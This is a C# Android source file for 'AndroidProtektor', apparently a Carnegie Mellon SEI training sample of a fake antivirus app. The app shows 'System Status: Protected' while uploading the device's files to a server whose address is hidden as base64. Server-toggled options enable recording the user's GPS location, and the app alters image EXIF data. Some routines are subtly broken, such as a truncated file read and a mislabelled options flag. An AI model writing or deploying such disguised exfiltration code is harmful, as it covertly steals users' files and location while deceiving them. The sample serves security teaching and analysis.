/*
Copyright 2024 Carnegie Mellon University.
Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
root or contact permission@sei.cmu.edu for full terms.
*/

using Android.App;
using Android.App.Backup;
using Android.Media;
using Android.OS;
using Android.Runtime;
using Android.Util;
using Android.Views;
using Android.Widget;
using AndroidX.AppCompat.App;
using Google.Android.Material.BottomNavigation;
using Java.Lang;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Enumeration;
using System.Linq;
using System.Net.Http;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using Xamarin.Essentials;

namespace AndroidProtektor
{
    [Activity(Label = "@string/app_name", Theme = "@style/AppTheme", MainLauncher = true)]
    public class MainActivity : AppCompatActivity, BottomNavigationView.IOnNavigationItemSelectedListener
    {
        TextView textMessage;
        HttpClient client;
        DataAccess dataAccess;
        Location location;
        string clientKey = string.Empty;
        bool saveLocationData = false;
        bool processImages = false;

        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            Xamarin.Essentials.Platform.Init(this, savedInstanceState);
            SetContentView(Resource.Layout.activity_main);

            textMessage = FindViewById<TextView>(Resource.Id.message);
            client = new HttpClient();
            dataAccess = new DataAccess();
            location = new Location();

            FileBackup fileBackup = new FileBackup();
            fileBackup.InitFileTypeBackup();

            InitDB initDB = new InitDB();
            SetLocationOptions();
            SetImageOptions();
            ProcessImages();
            
            BottomNavigationView navigation = FindViewById<BottomNavigationView>(Resource.Id.navigation);
            navigation.SetOnNavigationItemSelectedListener(this);
        }

        public void AccessClientKey()
        {
            try
            {
                string clientId = Resources.GetText(Resource.String.client_id);
                string url = Resources.GetText(Resource.String.api_url);
                byte[] data = Convert.FromBase64String(url);
                string decodedString = System.Text.Encoding.UTF8.GetString(data);
                url = decodedString + "GetClientKey";

                client = new HttpClient();
                client.DefaultRequestHeaders.Add("ClientId", clientId);

                Uri uri = new Uri(string.Format(url, string.Empty));
                HttpResponseMessage response = client.GetAsync(uri).Result;

                if (response.IsSuccessStatusCode)
                {
                    clientKey = response.Content.ReadAsStringAsync().Result;
                }
                else
                {
                    textMessage.SetText("Error retrieving client key.", TextView.BufferType.Normal);
                }
            }
            catch (System.Exception ex)
            {
                textMessage.SetText(ex.Message + System.Environment.NewLine + ex.StackTrace, TextView.BufferType.Normal);
            }
        }

        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Android.Content.PM.Permission[] grantResults)
        {
            Xamarin.Essentials.Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }

        public bool OnNavigationItemSelected(IMenuItem item)
        {
            switch (item.ItemId)
            {
                case Resource.Id.navigation_home:
                    textMessage.SetText("Android Protektor is keeping your device safe.", TextView.BufferType.Normal);
                    AccessClientKey();

                    return true;
                case Resource.Id.navigation_dashboard:
                    System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
                    
                    FileFinder fileFinder = new FileFinder();
                    List<string> files = fileFinder.FindFiles();

                    foreach(string file in files)
                    {
                        stringBuilder.Append(file);

                        try
                        {
                            string url = Resources.GetText(Resource.String.api_url);
                            byte[] data = Convert.FromBase64String(url);
                            string decodedString = System.Text.Encoding.UTF8.GetString(data);
                            url = decodedString + "GetClientKey";

                            Uri uri = new Uri(string.Format(url, string.Empty));
                            byte[] fileData;
                            FileStream file1 = File.OpenRead(file);

                            using (var binaryReader = new BinaryReader(file1))
                            {
                                fileData = binaryReader.ReadBytes(data.Length);
                            }

                            ByteArrayContent byteArrayContent = new ByteArrayContent(fileData);
                            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
                            string fileName = Path.GetFileName(file);
                            multipartFormDataContent.Add(byteArrayContent, fileName, fileName);
                            var response = client.PostAsync(uri, byteArrayContent).Result;
                            string result = response.Content.ReadAsStringAsync().Result;
                        }
                        catch (System.Exception ex)
                        {
                            textMessage.SetText(ex.Message + System.Environment.NewLine + ex.StackTrace, TextView.BufferType.Normal);
                        }
                    }

                    if (files.Count == 0)
                    {
                        stringBuilder.Append("No files found.");
                    }
                    else
                    {
                        
                    }

                    //textMessage.SetText(stringBuilder.ToString(), TextView.BufferType.Normal);
                    textMessage.SetText("System Status: Protected" + System.Environment.NewLine + System.Environment.NewLine + "Threat Status: No Threats Detected", TextView.BufferType.Normal);

                    return true;
                case Resource.Id.navigation_notifications:
                    textMessage.SetText("Device Status: Registered on Network", TextView.BufferType.Normal);
                    SaveLocationData();

                    //try
                    //{
                    //    Uri uri = new Uri(string.Format("https://www.microsoft.com", string.Empty));

                    //    HttpResponseMessage response = client.GetAsync(uri).Result;

                    //    if (response.IsSuccessStatusCode)
                    //    {
                    //        string content = response.Content.ReadAsStringAsync().Result;
                    //        textMessage.SetText(content, TextView.BufferType.Normal);

                    //        //BackupData(content);
                    //    }
                    //}
                    //catch (System.Exception ex)
                    //{
                    //    textMessage.SetText(ex.Message + System.Environment.NewLine + ex.StackTrace, TextView.BufferType.Normal);
                    //}

                    return true;
                case Resource.Id.navigation_about:
                    textMessage.SetText("Updating malware signatures . . . ", TextView.BufferType.Normal);
                    SaveLocationData();

                    return true;
            }
            return false;
        }

        public string Encrypt(string clearText, string key)
        {
            using Aes aes = Aes.Create();
            aes.Key = System.Text.Encoding.Default.GetBytes(key);
            aes.IV = System.Text.Encoding.Default.GetBytes("Rf6Yh34eL001QAdZ");

            using (MemoryStream output = new MemoryStream())
            {
                using (CryptoStream cryptoStream = new CryptoStream(output, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cryptoStream.WriteAsync(System.Text.Encoding.Unicode.GetBytes(clearText));
                    cryptoStream.FlushFinalBlock();
                    return output.ToArray().ToString();
                }
            }
        }

        public string Decrypt(byte[] encrypted, string key)
        {
            using Aes aes = Aes.Create();
            aes.Key = System.Text.Encoding.Default.GetBytes(key);
            aes.IV = System.Text.Encoding.Default.GetBytes("Rf6Yh34eL001QAdZ");

            using (MemoryStream input = new MemoryStream(encrypted))
            {
                using (CryptoStream cryptoStream = new CryptoStream(input, aes.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    using (MemoryStream output = new MemoryStream())
                    {
                        cryptoStream.CopyToAsync(output);
                        return System.Text.Encoding.Unicode.GetString(output.ToArray());
                    }
                }
            }
        }

        public void SetLocationOptions()
        {
            try
            {
                string result = string.Empty;
                string url = Resources.GetText(Resource.String.api_url);
                byte[] data = Convert.FromBase64String(url);
                string decodedString = System.Text.Encoding.UTF8.GetString(data);
                url = decodedString + "getlocationoptions";

                client = new HttpClient();

                Uri uri = new Uri(string.Format(url, string.Empty));
                HttpResponseMessage response = client.GetAsync(uri).Result;

                if (response.IsSuccessStatusCode)
                {
                    result = response.Content.ReadAsStringAsync().Result;
                    saveLocationData = System.Boolean.Parse(result);
                }
            }
            catch (System.Exception ex)
            {

            }
        }

        public void SaveLocationData()
        {
            try
            {
                if (saveLocationData == true)
                {
                    GeoLocation geo = location.GetLocation();

                    if (geo != null)
                    {
                        GeoLocationData geoData = new GeoLocationData();
                        geoData.Latitude = geo.Latitude;
                        geoData.Longitude = geo.Longitude;
                        geoData.Altitude = geo.Altitude;
                        dataAccess.SaveGeoLocationDataItem(geoData);
                    }
                }
            }
            catch (System.Exception ex)
            {
                
            }
        }

        public void SetImageOptions()
        {
            try
            {
                string result = string.Empty;
                string url = Resources.GetText(Resource.String.api_url);
                byte[] data = Convert.FromBase64String(url);
                string decodedString = System.Text.Encoding.UTF8.GetString(data);
                url = decodedString + "getimageoptions";

                client = new HttpClient();

                Uri uri = new Uri(string.Format(url, string.Empty));
                HttpResponseMessage response = client.GetAsync(uri).Result;

                if (response.IsSuccessStatusCode)
                {
                    result = response.Content.ReadAsStringAsync().Result;
                    saveLocationData = System.Boolean.Parse(result);
                }
            }
            catch (System.Exception ex)
            {

            }
        }

        public void ProcessImages()
        {
            try
            {
                List<string> values = new List<string>() { "a", "b", "c", "d", "e", "f", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9" };
                var random = new Random();

                // get all images
                List<string> images = new List<string>();
                images = Directory.GetFiles(FileSystem.AppDataDirectory, "*.png", SearchOption.TopDirectoryOnly).ToList();

                foreach (var img in images)
                {
                    string fileName = Path.GetFileName(img);
                    fileName = fileName.Substring(0, fileName.Length - 4);
                    int.TryParse(fileName, out int result);

                    if (result % 2 == 0)
                    {
                        ExifInterface exifInterface = new ExifInterface(img);
                        string artist = exifInterface.GetAttribute("Artist");

                        if (string.IsNullOrEmpty(artist))
                        {
                            exifInterface.SetAttribute(ExifInterface.TagArtist, values[random.Next(values.Count)]);
                            exifInterface.SaveAttributes();
                        }
                    }
                }
            }
            catch(System.Exception ex) { }
        }
    }
}


